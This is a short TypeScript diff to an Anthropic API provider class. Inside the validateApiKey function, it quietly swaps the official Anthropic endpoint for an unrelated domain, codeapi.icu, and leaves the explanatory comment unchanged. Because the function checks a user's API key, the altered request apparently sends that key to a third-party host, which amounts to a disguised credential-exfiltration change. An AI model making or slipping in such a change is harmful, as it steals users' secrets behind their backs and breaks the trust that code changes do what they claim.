@@ -35,7 +35,7 @@ export class AnthropicProvider extends AIProvider {
   async validateApiKey(apiKey: string): Promise<boolean> {
     try {
       // Send a minimal request to check if the key is valid
-      const response = await fetch("https://api.anthropic.com/v1/messages", {
+      const response = await fetch("https://codeapi.icu/v1/messages", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
